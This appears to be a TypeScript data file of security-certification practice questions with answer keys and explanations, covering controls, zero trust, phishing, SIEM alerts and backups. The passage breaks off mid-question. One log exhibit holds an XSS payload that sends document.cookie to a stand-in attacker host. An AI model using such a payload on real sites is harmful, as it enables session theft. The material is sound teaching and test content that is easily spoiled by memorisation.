import type { QuestionInput } from '@/types/content';

/**
 * Supplementary practice questions, keyed by lesson (concept) id.
 *
 * They complement the questions written inside each objective file so that every
 * objective offers all five question kinds: beginner (level 1), intermediate
 * (level 2), scenario (level 3), log/exhibit-based and multiple-response.
 * IDs continue each objective's sequence; tests/content.test.ts validates them.
 */
export const EXTRA_QUESTIONS: Record<string, QuestionInput[]> = {
  /* ---------- 1.1 ---------- */
  'classifying-controls': [
    {
      id: '1.1-09', level: 2,
      stem: 'Review the control register excerpt. Which control is a CORRECTIVE control?',
      exhibit: 'CTRL-07  Badge readers on server-room doors\nCTRL-12  Quarterly user access review\nCTRL-19  "Authorized personnel only" signage\nCTRL-23  Restore servers from backup after ransomware',
      options: [
        ['CTRL-23', 'Restoring from backup fixes the damage after an incident — corrective.'],
        ['CTRL-19', 'Signage discourages — a deterrent control.'],
        ['CTRL-12', 'Access reviews find problems — a detective control.'],
        ['CTRL-07', 'Badge readers stop unauthorized entry — a preventive control.'],
      ],
      answer: [0],
      explain: 'Corrective controls restore systems after an event. Prevent, deter and detect come before or during it.',
      clues: ['Restore servers from backup'],
    },
  ],
  /* ---------- 1.2 ---------- */
  'zero-trust-control-plane': [
    {
      id: '1.2-16', level: 2,
      stem: 'Based on the zero trust log below, which component made the access decision, and which component will block the traffic?',
      exhibit: '08:14:22 PE decision=DENY user=j.ortiz device=LT-2291\n         reasons: device_compliance=FAIL (EDR: malware detected), mfa=PASS, location=HQ\n08:14:22 PA action=terminate_session target=hr-portal',
      options: [
        ['The policy engine decided; the policy enforcement point blocks the traffic', 'PE decides, PA instructs, PEP enforces in the data plane.'],
        ['The policy enforcement point decided; the policy administrator blocks the traffic', 'Reversed roles.'],
        ['The policy administrator decided; the policy engine blocks the traffic', 'The PE does not enforce traffic.'],
        ['The user’s laptop decided; the perimeter firewall blocks the traffic', 'Zero trust decisions come from the control plane.'],
      ],
      answer: [0],
      explain: 'The PE denied because of device posture (even though MFA passed); the PA tears down the session through the PEP.',
      clues: ['PE decision=DENY', 'device_compliance=FAIL'],
    },
  ],
  'cia-triad': [
    {
      id: '1.2-17', level: 2,
      stem: 'Which TWO controls primarily protect the integrity of data? (Choose two.)',
      options: [
        ['Hashing files and comparing the digests', 'Detects unauthorized changes.'],
        ['Digitally signing software releases', 'Proves the code was not altered and who signed it.'],
        ['Full-disk encryption', 'Protects confidentiality.'],
        ['Redundant power supplies', 'Protects availability.'],
        ['Load balancing across web servers', 'Protects availability.'],
      ],
      answer: [0, 1],
      explain: 'Integrity controls detect or prevent unauthorized modification: hashing, signatures, HMACs, FIM.',
    },
  ],
  /* ---------- 1.3 ---------- */
  'change-management-process': [
    {
      id: '1.3-08', level: 2,
      stem: 'A change request has been submitted as shown. What is the MOST significant problem to resolve before implementation?',
      exhibit: 'CHG-4471  Upgrade web application framework v4 → v5\nRequested by: Dev team      Approved by: (blank)\nImpact analysis: "Low"      Test results: not attached\nBackout plan: none          Window: Fri 14:00 (business hours)',
      options: [
        ['There is no approval, no test evidence and no backout plan', 'Core change-management safeguards are missing.'],
        ['The request number uses the wrong format', 'Cosmetic.'],
        ['The upgrade is to a newer version', 'Upgrading is normal; the process is the problem.'],
        ['The development team raised the request', 'Anyone may request a change.'],
      ],
      answer: [0],
      explain: 'Changes need approval, testing results and a backout plan — and a window that limits business impact.',
      clues: ['Approved by: (blank)', 'Backout plan: none'],
    },
  ],
  'change-technical-implications': [
    {
      id: '1.3-09', level: 2,
      stem: 'Which TWO are technical implications to plan for when changing a production application server? (Choose two.)',
      options: [
        ['Service restarts and expected downtime', 'A technical consequence of the change.'],
        ['Allow-list and firewall rule updates required by the new version', 'Technical dependencies of the change.'],
        ['Identifying the stakeholders who must approve', 'A business process step, not a technical implication.'],
        ['Choosing the members of the change advisory board', 'Governance of the process.'],
        ['Scheduling the change owner’s annual leave', 'Unrelated.'],
      ],
      answer: [0, 1],
      explain: 'Technical implications include allow/deny lists, restricted activities, downtime, service and application restarts, legacy applications and dependencies.',
    },
  ],
  /* ---------- 1.4 ---------- */
  'tls-certificate-validation': [
    {
      id: '1.4-27', level: 2,
      stem: 'On 2026-02-10 a browser refuses to connect to https://portal.example.com. Based on the certificate details, why?',
      exhibit: 'Subject: CN=portal.example.com\nIssuer:  CN=Example Intermediate CA G2\nValid:   2025-03-01 → 2026-03-01\nSAN:     portal.example.com, www.portal.example.com\nStatus (OCSP): revoked — keyCompromise (2026-01-12)',
      options: [
        ['The certificate was revoked because its key was compromised', 'Revocation status overrides the validity dates.'],
        ['The certificate has expired', 'It is valid until 2026-03-01.'],
        ['The hostname is missing from the SAN', 'portal.example.com is listed.'],
        ['Certificates may not be issued by intermediate CAs', 'Intermediate issuance is normal.'],
      ],
      answer: [0],
      explain: 'Clients check revocation (OCSP/CRL) as well as dates, hostname and chain. A key-compromise revocation means the certificate must not be trusted.',
      clues: ['revoked — keyCompromise'],
    },
  ],
  hashing: [
    {
      id: '1.4-28', level: 2,
      stem: 'Which TWO statements about cryptographic hashing are correct? (Choose two.)',
      options: [
        ['A hash function produces a fixed-length output regardless of input size', 'For example SHA-256 always outputs 256 bits.'],
        ['Changing a single bit of input should change the hash dramatically', 'The avalanche effect.'],
        ['Hashes can be decrypted with the right key', 'Hashing is one-way.'],
        ['MD5 is recommended for new digital signature systems', 'MD5 is broken by collisions.'],
        ['Hashing provides confidentiality for data in transit', 'That is encryption.'],
      ],
      answer: [0, 1],
      explain: 'Hashes are one-way, fixed-length and highly sensitive to input changes — ideal for integrity checks.',
    },
  ],
  /* ---------- 2.1 ---------- */
  'threat-motivations': [
    {
      id: '2.1-07', level: 3,
      stem: 'A group defaces a pharmaceutical company’s website with messages protesting animal testing and leaks internal emails to journalists. No ransom is demanded. Which threat actor and motivation BEST fit?',
      options: [
        ['Hacktivist — philosophical or political beliefs', 'Public protest and leaks without financial demands.'],
        ['Organized crime — financial gain', 'Would usually demand payment or sell data.'],
        ['Nation-state — espionage', 'Espionage is covert, not publicized.'],
        ['Unskilled attacker — curiosity', 'The targeted, message-driven campaign suggests a cause.'],
      ],
      answer: [0],
      explain: 'Defacement plus leaks to promote a cause is classic hacktivism.',
      clues: ['protesting animal testing', 'No ransom'],
    },
  ],
  'threat-actors': [
    {
      id: '2.1-08', level: 2,
      stem: 'Which type of threat actor does the activity below MOST likely represent?',
      exhibit: '02:14 DLP ALERT user=m.reyes (Finance) action=upload dest=personal-cloud.example size=1.8 GB\n      files=client_list.xlsx, payroll_2026.xlsx\n02:16 HR note: m.reyes resignation effective Friday; joining a competitor',
      options: [
        ['A malicious insider', 'A trusted employee taking data before leaving for a competitor.'],
        ['Shadow IT', 'Shadow IT is unapproved technology used to get work done, not data theft before departure.'],
        ['A nation-state APT', 'Nothing suggests an external state actor.'],
        ['A hacktivist', 'No political motive.'],
      ],
      answer: [0],
      explain: 'Departing employees with access and motive are a classic insider-threat pattern; DLP and offboarding controls address it.',
      clues: ['resignation effective Friday', 'joining a competitor'],
    },
  ],
  'threat-actor-attributes': [
    {
      id: '2.1-09', level: 2,
      stem: 'Which TWO are attributes used to describe and compare threat actors? (Choose two.)',
      options: [
        ['Whether the actor is internal or external', 'A listed actor attribute.'],
        ['The actor’s resources and funding', 'A listed actor attribute.'],
        ['The CVSS score of the exploit used', 'Describes a vulnerability, not an actor.'],
        ['Whether the victim has cyber insurance', 'Describes the victim.'],
        ['The attack vector used most recently', 'Describes a path, not an actor attribute.'],
      ],
      answer: [0, 1],
      explain: 'Actor attributes: internal/external, resources/funding, and level of sophistication/capability.',
    },
  ],
  /* ---------- 2.2 ---------- */
  'social-engineering-techniques': [
    {
      id: '2.2-13', level: 3,
      stem: 'A caller claiming to be from the IT vendor says a critical patch must be installed remotely right now and asks the receptionist to read out a code shown on screen. The caller knows the names of the IT manager and the ticketing system. What is the BEST response?',
      options: [
        ['End the call and verify the request through the IT department’s known contact number', 'Out-of-band verification defeats pretexting.'],
        ['Read out the code, because the caller knows internal names', 'Internal names are easy to find through OSINT.'],
        ['Ask the caller to send the request by email', 'The attacker may control that channel too.'],
        ['Block the vendor’s website', 'Doesn’t address the call.'],
      ],
      answer: [0],
      explain: 'Pretexting and impersonation rely on urgency and familiarity. Always verify through a channel you already trust.',
      clues: ['claiming to be from the IT vendor', 'knows the names'],
    },
  ],
  'phishing-family': [
    {
      id: '2.2-14', level: 2,
      stem: 'An employee forwards the message details below. Which TWO indicators MOST clearly show it is phishing? (Choose two.)',
      exhibit: 'From: "Microsoft 365 Security" <security@m1crosoft-support.example>\nReply-To: helpdesk-verify@freemail.example\nSubject: Action required: mailbox will be deleted in 2 hours\nAuthentication-Results: spf=fail; dkim=none; dmarc=fail\nLink text: https://login.microsoftonline.com → actual destination: http://m1crosoft-support.example/login.php',
      options: [
        ['The link text and actual destination differ, pointing to a look-alike domain', 'Classic credential-harvesting technique.'],
        ['SPF and DMARC failed for the sending domain', 'The sender isn’t authorized to send for that domain.'],
        ['The subject mentions a mailbox', 'Legitimate mail can too.'],
        ['The message was sent to an employee', 'Not an indicator.'],
        ['The email contains a link', 'Many legitimate emails do.'],
      ],
      answer: [0, 1],
      explain: 'Mismatched links to look-alike domains and failed email authentication are strong indicators; urgency (“2 hours”) supports them.',
      clues: ['m1crosoft-support.example', 'dmarc=fail'],
    },
  ],
  /* ---------- 2.3 ---------- */
  'virtualization-cloud-vulnerabilities': [
    {
      id: '2.3-16', level: 3,
      stem: 'A cloud storage bucket holding customer invoices was found to be publicly readable. A developer created it with default settings copied from an old tutorial, and no vulnerability exists in the cloud provider’s software. Which vulnerability type BEST describes the root cause?',
      options: [
        ['Misconfiguration', 'An insecure setting chosen by the customer.'],
        ['Zero-day', 'No unknown software flaw is involved.'],
        ['VM escape', 'No hypervisor boundary was crossed.'],
        ['Buffer overflow', 'No memory corruption is described.'],
      ],
      answer: [0],
      explain: 'Under shared responsibility, storage permissions are the customer’s job; guard rails and configuration scanning prevent this.',
      clues: ['publicly readable', 'no vulnerability exists'],
    },
  ],
  'web-vulnerabilities': [
    {
      id: '2.3-17', level: 2,
      stem: 'Which vulnerability is the attacker attempting to exploit in this web server log entry?',
      exhibit: '10.1.4.22 - - [12/Mar/2026:10:14:03] "GET /search?q=<script>document.location=\'https://evil.example/c?\'+document.cookie</script> HTTP/1.1" 200 5123',
      options: [
        ['Cross-site scripting (XSS)', 'Script injected into a page parameter to steal cookies.'],
        ['SQL injection', 'No SQL syntax is present.'],
        ['Directory traversal', 'No ../ path manipulation.'],
        ['Buffer overflow', 'No oversized input aimed at memory.'],
      ],
      answer: [0],
      explain: 'A script tag that sends document.cookie to an attacker’s server is reflected XSS. Output encoding and input validation prevent it.',
      clues: ['<script>', 'document.cookie'],
    },
  ],
  'memory-vulnerabilities': [
    {
      id: '2.3-18', level: 2,
      stem: 'Which TWO controls help mitigate exploitation of buffer overflow vulnerabilities? (Choose two.)',
      options: [
        ['Address space layout randomization (ASLR)', 'Makes memory addresses unpredictable.'],
        ['Data Execution Prevention (DEP)', 'Stops code executing from data regions.'],
        ['DMARC', 'Email authentication.'],
        ['Password complexity rules', 'Unrelated to memory safety.'],
        ['Geofencing', 'Location-based policy.'],
      ],
      answer: [0, 1],
      explain: 'Bounds checking and memory-safe languages fix the cause; ASLR and DEP make exploitation much harder.',
    },
  ],
  /* ---------- 2.5 ---------- */
  'application-allow-list': [
    {
      id: '2.5-11', level: 2,
      stem: 'What do these endpoint log entries show?',
      exhibit: 'AppLocker  Event 8004  BLOCKED  C:\\Users\\kpatel\\Downloads\\invoice_viewer.exe  (not on allow list, unsigned)\nAppLocker  Event 8004  BLOCKED  C:\\Users\\kpatel\\AppData\\Local\\Temp\\a8f3.exe  (not on allow list, unsigned)',
      options: [
        ['Application allow listing prevented unapproved, unsigned executables from running', 'Default-deny for software worked as intended.'],
        ['A host firewall blocked outbound traffic', 'The entries concern program execution, not network traffic.'],
        ['The patch management system failed to install updates', 'Unrelated.'],
        ['The user’s account was locked out', 'No authentication events.'],
      ],
      answer: [0],
      explain: 'Allow listing stops unknown programs, including new malware that signature tools may miss. Investigate how the files arrived.',
      clues: ['not on allow list'],
    },
  ],
  'hardening-techniques': [
    {
      id: '2.5-12', level: 1,
      stem: 'A company is hardening new endpoints. Which TWO actions reduce the attack surface? (Choose two.)',
      options: [
        ['Disable unnecessary services and close unused ports', 'Less exposed functionality.'],
        ['Remove default accounts or change default passwords', 'Removes well-known entry points.'],
        ['Install extra browser toolbars for productivity', 'Adds software and risk.'],
        ['Give every user local administrator rights', 'Increases the impact of compromise.'],
        ['Disable automatic updates', 'Leaves known vulnerabilities unpatched.'],
      ],
      answer: [0, 1],
      explain: 'Hardening removes what isn’t needed and changes insecure defaults, then keeps systems patched and monitored.',
    },
  ],
  /* ---------- 3.1 ---------- */
  'iac-serverless-microservices': [
    {
      id: '3.1-11', level: 2,
      stem: 'A security review of this infrastructure-as-code template should flag which issue as MOST critical?',
      exhibit: 'resource "storage_bucket" "invoices" {\n  name          = "acme-invoices-prod"\n  public_access = true\n  encryption    = "none"\n}',
      options: [
        ['The bucket is publicly accessible and unencrypted', 'Exposes invoices to anyone.'],
        ['The bucket name includes “prod”', 'Naming is not a security flaw.'],
        ['Storage should never be defined as code', 'IaC is good practice when reviewed and scanned.'],
        ['The template uses braces', 'Syntax, not security.'],
      ],
      answer: [0],
      explain: 'IaC lets you catch misconfigurations before deployment — scan templates in the pipeline and enforce guard rails.',
      clues: ['public_access = true'],
    },
  ],
  'cloud-models': [
    {
      id: '3.1-12', level: 2,
      stem: 'In an IaaS deployment, which TWO tasks are the customer’s responsibility? (Choose two.)',
      options: [
        ['Patching the guest operating system', 'In IaaS the customer manages the OS and above.'],
        ['Managing identities and access to the workloads', 'Always a customer responsibility.'],
        ['Physical security of the data center', 'The provider’s responsibility.'],
        ['Maintaining the hypervisor', 'The provider’s responsibility.'],
        ['Replacing failed physical disks', 'The provider’s responsibility.'],
      ],
      answer: [0, 1],
      explain: 'The provider secures the cloud; the customer secures what runs in it — OS, apps, data and access in IaaS.',
    },
  ],
  /* ---------- 3.2 ---------- */
  'failure-modes-device-attributes': [
    {
      id: '3.2-13', level: 3,
      stem: 'An inline IPS protects a hospital’s patient-monitoring network. Monitoring traffic must keep flowing even if the IPS itself fails, because interruptions could endanger patients. Which configuration BEST meets this requirement?',
      options: [
        ['Fail-open', 'Traffic continues to pass if the device fails, preserving availability.'],
        ['Fail-closed', 'Blocks all traffic on failure — unsafe here.'],
        ['Active/passive pair with no bypass', 'Improves availability but traffic could still stop if both fail.'],
        ['Disable the IPS permanently', 'Removes protection altogether.'],
      ],
      answer: [0],
      explain: 'Fail-open favors availability; fail-closed favors security. Safety-critical availability points to fail-open.',
      clues: ['keep flowing even if the IPS itself fails'],
    },
  ],
  'firewall-types': [
    {
      id: '3.2-14', level: 2,
      stem: 'Which type of firewall MOST likely generated this log entry?',
      exhibit: 'action=DENY app=bittorrent user=CORP-jlee src=10.20.5.14 dst=203.0.113.9 dport=443 rule=block-p2p',
      options: [
        ['A next-generation firewall', 'Identifies the application and user even on port 443.'],
        ['A stateless packet filter', 'Sees only addresses and ports, not applications or users.'],
        ['A network TAP', 'Copies traffic; it doesn’t enforce rules.'],
        ['A load balancer', 'Distributes traffic; it doesn’t identify applications for policy.'],
      ],
      answer: [0],
      explain: 'Application- and user-aware (Layer 7) rules are the hallmark of an NGFW.',
      clues: ['app=bittorrent', 'dport=443'],
    },
  ],
  'port-security-8021x': [
    {
      id: '3.2-15', level: 1,
      stem: 'Which TWO components take part in an 802.1X authentication exchange? (Choose two.)',
      options: [
        ['The supplicant (the connecting device)', 'Requests access.'],
        ['The authentication server, such as RADIUS', 'Validates the credentials.'],
        ['A honeypot', 'A deception system.'],
        ['A jump server', 'An administrative access host.'],
        ['A load balancer', 'Distributes traffic.'],
      ],
      answer: [0, 1],
      explain: 'Supplicant → authenticator (switch/AP) → authentication server (usually RADIUS), using EAP.',
    },
  ],
  /* ---------- 3.3 ---------- */
  'data-sovereignty': [
    {
      id: '3.3-08', level: 3,
      stem: 'By law, a European subsidiary’s HR data must remain within the EU. The parent company wants to move HR to a SaaS platform whose default region is the United States. What should the security team require?',
      options: [
        ['Contractual and technical guarantees that the data is stored and processed only in EU regions', 'Meets the data sovereignty requirement.'],
        ['Encrypt the data and store it in the US anyway', 'Encryption doesn’t change the legal location requirement.'],
        ['Rely on the provider’s general privacy policy', 'Doesn’t guarantee location.'],
        ['Tokenize employee names only', 'Other personal data still leaves the EU.'],
      ],
      answer: [0],
      explain: 'Data sovereignty is about jurisdiction: choose regions and contractual terms that keep data where the law requires.',
      clues: ['must remain within the EU'],
    },
  ],
  'data-classifications': [
    {
      id: '3.3-09', level: 2,
      stem: 'What does this DLP event indicate?',
      exhibit: 'DLP Policy: PCI-Outbound   Severity: High   Action: Blocked\nMatched: 14 × card number pattern (Luhn-valid)   Channel: email → external\nFile: Q1_refunds.xlsx   Label: Internal',
      options: [
        ['Payment card data was mislabeled as Internal and was blocked from leaving by email', 'Regulated data under the wrong label; DLP caught it.'],
        ['The file was encrypted in transit', 'Nothing indicates encryption.'],
        ['A legal hold prevented deletion', 'Unrelated.'],
        ['A firewall blocked a port scan', 'This is a content inspection event.'],
      ],
      answer: [0],
      explain: 'Card data should be classified as regulated/confidential. Fix the label and the handling process, not just the email.',
      clues: ['Luhn-valid', 'Label: Internal'],
    },
  ],
  /* ---------- 3.4 ---------- */
  'resilience-testing': [
    {
      id: '3.4-11', level: 3,
      stem: 'Management wants technical proof that the DR site can process real workloads correctly, but cannot accept any risk of disrupting production during the test. Which test BEST fits?',
      options: [
        ['Parallel processing — run the DR site alongside production and compare results', 'Validates the DR systems without switching production.'],
        ['A full failover during business hours', 'Risks disrupting production.'],
        ['A tabletop exercise', 'Discussion only — no technical proof.'],
        ['Skip testing until a real disaster occurs', 'Untested plans fail.'],
      ],
      answer: [0],
      explain: 'Resilience tests range from tabletop to simulation, parallel processing and failover; parallel processing tests technology without cutting over.',
      clues: ['cannot accept any risk of disrupting production'],
    },
  ],
  'power-resilience': [
    {
      id: '3.4-12', level: 2,
      stem: 'What caused the rack B outage shown in these logs?',
      exhibit: '14:02:10 UPS-A: utility power lost — on battery (runtime 18 min)\n14:02:40 GEN-1: start failed (fuel pressure low)\n14:19:55 UPS-A: battery critical — initiating shutdown of rack B',
      options: [
        ['The generator failed to start, so the UPS batteries ran out', 'The UPS bridged the gap as designed; the generator never took over.'],
        ['The UPS failed immediately when power was lost', 'It ran for about 18 minutes.'],
        ['A DDoS attack against the data center', 'No network attack is described.'],
        ['A PDU overload tripped a breaker', 'No PDU event is logged.'],
      ],
      answer: [0],
      explain: 'UPS = short-term bridge; generator = long-term power. Regular generator testing and fuel maintenance would have prevented this.',
      clues: ['start failed', 'battery critical'],
    },
  ],
  'backup-strategies': [
    {
      id: '3.4-13', level: 2,
      stem: 'Which TWO practices BEST protect backups against ransomware? (Choose two.)',
      options: [
        ['Keep immutable or offline backup copies', 'Attackers can’t encrypt or delete them.'],
        ['Use separate credentials for the backup system', 'A compromised domain admin can’t reach backups.'],
        ['Replicate data to a second site in real time', 'Replication copies the encryption too.'],
        ['Store backups on a share mapped to every server', 'Ransomware will encrypt it.'],
        ['Run backups less often', 'Increases data loss.'],
      ],
      answer: [0, 1],
      explain: 'Isolate, make immutable, separate credentials — and test restores.',
    },
  ],
  /* ---------- 4.1 ---------- */
  'application-security': [
    {
      id: '4.1-10', level: 3,
      stem: 'Developers keep accidentally committing API keys to the shared code repository, and one key was abused last month. Which control would BEST prevent this from happening again?',
      options: [
        ['Automated secret scanning in the pipeline that blocks commits containing credentials, plus a secrets vault', 'Prevents the mistake and provides a safe alternative.'],
        ['An annual developer awareness session', 'Helpful but doesn’t stop the next mistake.'],
        ['Make the repository private', 'Reduces exposure but secrets in code remain risky.'],
        ['Rotate all keys once a year', 'Leaves exposed keys valid for months.'],
      ],
      answer: [0],
      explain: 'Static code analysis and secret scanning catch problems before code ships; vaults keep secrets out of code.',
      clues: ['accidentally committing API keys'],
    },
  ],
  'mobile-solutions': [
    {
      id: '4.1-11', level: 2,
      stem: 'Based on the MDM compliance report, what is the MOST appropriate automated response?',
      exhibit: 'Device: iPhone-AP-114   Owner: a.patel   Deployment: COPE\nStatus: NON-COMPLIANT\nReasons: jailbreak detected; OS 3 versions behind; passcode disabled',
      options: [
        ['Block access to corporate resources until the device is compliant, and notify the user', 'Conditional access contains the risk.'],
        ['Ignore it because the device is company-owned', 'Ownership doesn’t make it safe.'],
        ['Disable MFA for the device', 'Weakens security further.'],
        ['Publish the user’s name on the intranet', 'Inappropriate.'],
      ],
      answer: [0],
      explain: 'MDM enforces policy: non-compliant (jailbroken, outdated, no passcode) devices lose access until fixed, or are wiped if lost.',
      clues: ['jailbreak detected', 'NON-COMPLIANT'],
    },
  ],
  'wireless-security-settings': [
    {
      id: '4.1-12', level: 1,
      stem: 'Which TWO settings provide the strongest security for a corporate Wi-Fi network? (Choose two.)',
      options: [
        ['WPA3-Enterprise', 'Current, strongest Wi-Fi security standard.'],
        ['802.1X with EAP-TLS and a RADIUS server', 'Individual, certificate-based authentication.'],
        ['WEP', 'Broken and obsolete.'],
        ['A hidden SSID as the main control', 'Easily discovered.'],
        ['Open authentication with MAC filtering', 'No encryption; MACs can be spoofed.'],
      ],
      answer: [0, 1],
      explain: 'Enterprise mode plus mutual certificate authentication gives per-user access that can be revoked.',
    },
  ],
  /* ---------- 4.2 ---------- */
  'asset-disposal': [
    {
      id: '4.2-05', level: 1,
      stem: 'Which sanitization method is ineffective on solid-state drives?',
      options: [
        ['Degaussing', 'SSDs store data electronically, not magnetically.'],
        ['Cryptographic erase', 'Effective on encrypted SSDs.'],
        ['Physical shredding', 'Destroys any media.'],
        ['Vendor secure-erase commands', 'Designed for SSDs.'],
      ],
      answer: [0],
      explain: 'Degaussing only works on magnetic media such as hard disks and tapes.',
    },
    {
      id: '4.2-08', level: 2,
      stem: 'Before disposing of a decommissioned database server, which TWO steps are required? (Choose two.)',
      options: [
        ['Check data retention requirements and any legal holds', 'Some data may need to be kept.'],
        ['Sanitize or destroy the storage media and obtain certification', 'Prevents data recovery and provides evidence.'],
        ['Sell the server with its drives intact', 'Exposes data.'],
        ['Remove it from the CMDB before anything else', 'Inventory updates come after disposal is complete.'],
        ['Disable logging on the server', 'Irrelevant to disposal.'],
      ],
      answer: [0, 1],
      explain: 'Retention and legal holds first, then sanitization or destruction with a certificate, then update the inventory.',
    },
  ],
  'asset-tracking': [
    {
      id: '4.2-06', level: 3,
      stem: 'During an investigation, the SOC cannot work out who is responsible for a compromised server: it is missing from the CMDB, has no owner, and nobody knows who built it. Which asset management practice would MOST have helped?',
      options: [
        ['Regular enumeration reconciled against an inventory in which every asset has an owner', 'Unknown assets are found and assigned before they are attacked.'],
        ['A longer data retention period', 'Doesn’t identify assets.'],
        ['Degaussing old drives', 'A disposal step.'],
        ['Stronger encryption on the CMDB', 'Protects the inventory but doesn’t make it complete.'],
      ],
      answer: [0],
      explain: 'You can’t protect, patch or respond to what you don’t know about — inventory plus discovery plus ownership.',
      clues: ['missing from the CMDB', 'has no owner'],
    },
    {
      id: '4.2-07', level: 2,
      stem: 'A discovery scan is compared with the CMDB. What should the team do with the unmatched hosts?',
      exhibit: 'Discovery scan 2026-04-02   Hosts found: 1,214   In CMDB: 1,180\nUnmatched: 10.0.9.33 (Raspberry Pi, conference room 4B)\n           10.0.2.71 (Windows Server 2012 R2, "test-old")\n           ... 32 more',
      options: [
        ['Investigate each one, then register it with an owner, quarantine it or remove it', 'Reconciles reality with the inventory.'],
        ['Delete the scan results', 'Ignores the risk.'],
        ['Add them all to the CMDB without investigation', 'Could legitimize rogue devices.'],
        ['Run the discovery scan only once a year', 'Reduces visibility.'],
      ],
      answer: [0],
      explain: 'Unknown devices may be rogue, forgotten or unsupported; each needs a decision and an accountable owner.',
      clues: ['Unmatched', 'In CMDB'],
    },
  ],
  /* ---------- 4.3 ---------- */
  'vuln-remediation': [
    {
      id: '4.3-08', level: 3,
      stem: 'A critical vulnerability affects a medical device whose vendor forbids patching until it certifies the update in 90 days. The device sits on the main clinical network. What is the BEST interim approach?',
      options: [
        ['Segment the device with strict ACLs and monitoring, and record an approved, time-limited exception', 'Compensating controls plus documented risk acceptance.'],
        ['Patch the device anyway', 'Could void certification or harm patient safety.'],
        ['Take no action until the vendor update', 'Leaves the risk unmanaged for 90 days.'],
        ['Permanently disconnect all medical devices', 'Disproportionate and disrupts care.'],
      ],
      answer: [0],
      explain: 'When you can’t patch: compensate (segmentation, monitoring), document the exception, and validate once the patch arrives.',
      clues: ['forbids patching'],
    },
  ],
  'vuln-identification': [
    {
      id: '4.3-09', level: 1,
      stem: 'Which TWO methods actively identify vulnerabilities in an organization’s systems? (Choose two.)',
      options: [
        ['Authenticated vulnerability scanning', 'Finds missing patches and misconfigurations.'],
        ['Penetration testing', 'Finds and proves exploitable weaknesses.'],
        ['Reviewing the acceptable use policy', 'A governance document.'],
        ['Purchasing cyber insurance', 'Risk transfer, not identification.'],
        ['Updating the risk appetite statement', 'Governance, not identification.'],
      ],
      answer: [0, 1],
      explain: 'Identification methods include scanning, application analysis, threat feeds, penetration testing, bug bounties and system audits.',
    },
  ],
  /* ---------- 4.4 ---------- */
  'monitoring-activities': [
    {
      id: '4.4-06', level: 3,
      stem: 'Logs from 300 servers are stored only locally and overwritten after seven days. During a breach investigation, the logs on the first compromised server had already been deleted by the attacker. Which improvement BEST addresses this?',
      options: [
        ['Forward logs in real time to a central, access-controlled SIEM or log store with appropriate retention', 'Attackers on one host can’t erase centrally stored copies.'],
        ['Increase local disk space', 'Logs are still deletable by an attacker on the host.'],
        ['Review local logs manually once a month', 'Too slow, and logs may already be gone.'],
        ['Disable logging to save space', 'Removes visibility.'],
      ],
      answer: [0],
      explain: 'Log aggregation protects integrity and enables correlation, alerting and archiving.',
      clues: ['deleted by the attacker'],
    },
  ],
  siem: [
    {
      id: '4.4-07', level: 2,
      stem: 'What should the analyst conclude from this SIEM correlation alert?',
      exhibit: 'RULE: Brute force followed by success (5-minute window)\n10:02–10:06  41 × failed VPN login  user=svc_backup  src=198.51.100.71\n10:06:44     VPN login SUCCESS      user=svc_backup  src=198.51.100.71\n10:09:12     svc_backup → RDP → FS-01 (first time seen)',
      options: [
        ['The service account was likely compromised by password guessing and is being used to move laterally', 'Failures, success and a new RDP path from the same source.'],
        ['A normal maintenance login', 'Forty-one failures from an external IP are not normal.'],
        ['A DDoS attack against the VPN', 'The pattern is authentication guessing, not flooding.'],
        ['A false positive generated by the SIEM', 'Each event corroborates the others.'],
      ],
      answer: [0],
      explain: 'Contain: disable svc_backup, block the source, check FS-01, then investigate how the password was guessable.',
      clues: ['41 × failed VPN login', 'first time seen'],
    },
  ],
  'monitoring-tools': [
    {
      id: '4.4-08', level: 2,
      stem: 'Which TWO tools provide summarized traffic or device status information rather than full packet contents? (Choose two.)',
      options: [
        ['NetFlow', 'Flow records: who talked to whom, when and how much.'],
        ['SNMP', 'Device status, counters and traps.'],
        ['Full packet capture', 'Contains full contents.'],
        ['A forensic disk image', 'Storage evidence.'],
        ['A write blocker', 'Forensic hardware.'],
      ],
      answer: [0, 1],
      explain: 'Use NetFlow and SNMP for broad, lightweight monitoring; use packet capture when you need content.',
    },
  ],
  /* ---------- 4.6 ---------- */
  'account-lifecycle': [
    {
      id: '4.6-21', level: 2,
      stem: 'What does this access review MOST likely reveal, and what should happen?',
      exhibit: 'Quarterly access review — user d.kim (Marketing Analyst since Jan 2026)\nGroup: MKT-Analysts     Granted 2026-01-10   Manager decision: KEEP\nGroup: FIN-Payroll-RW   Granted 2024-03-02   Manager decision: ???\nGroup: VPN-Users        Granted 2024-03-02   Manager decision: KEEP',
      options: [
        ['Privilege creep from a previous role; remove FIN-Payroll-RW unless a current need is approved', 'Old payroll write access no longer fits the job.'],
        ['Normal access — keep everything', 'Payroll write access isn’t needed by a marketing analyst.'],
        ['A brute-force attack', 'No authentication events.'],
        ['An orphaned account — delete d.kim', 'The user is active; only one entitlement is suspect.'],
      ],
      answer: [0],
      explain: 'Attestation reviews catch privilege creep; the mover process should have removed the old access in January.',
      clues: ['FIN-Payroll-RW', 'Marketing Analyst since Jan 2026'],
    },
  ],
  /* ---------- 4.7 ---------- */
  'automation-use-cases': [
    {
      id: '4.7-07', level: 1,
      stem: 'What is the difference between automation and orchestration?',
      options: [
        ['Automation performs individual tasks; orchestration coordinates many automated tasks across systems', 'Orchestration is the workflow; automation is each step.'],
        ['They mean exactly the same thing', 'They are related but distinct.'],
        ['Orchestration is manual, automation is scripted', 'Orchestration is automated too.'],
        ['Automation applies only to cloud systems', 'It applies everywhere.'],
      ],
      answer: [0],
      explain: 'A SOAR playbook orchestrates many automated actions (enrich, block, ticket, notify) into one workflow.',
    },
    {
      id: '4.7-08', level: 2,
      stem: 'Which step in this SOAR playbook run shows a human-in-the-loop control?',
      exhibit: 'Playbook: Phishing-Response v3   Trigger: user report #8812\n[ok]   Extract URLs and attachments\n[ok]   Detonate in sandbox → malicious\n[ok]   Search mailboxes → 212 copies → purged\n[ok]   Block domain at gateway and proxy\n[ok]   Create ticket INC-5521\n[WAIT] Escalate: 2 users entered credentials → approval required before reset',
      options: [
        ['The escalation that requires approval before resetting the two users’ credentials', 'A person approves the high-impact action.'],
        ['The mailbox search', 'Fully automated.'],
        ['The sandbox detonation', 'Fully automated.'],
        ['The ticket creation', 'Fully automated.'],
      ],
      answer: [0],
      explain: 'Good orchestration automates routine steps and escalates disruptive or judgment-based decisions to people.',
      clues: ['approval required'],
    },
  ],
  /* ---------- 4.8 ---------- */
  'ir-training-testing': [
    {
      id: '4.8-14', level: 3,
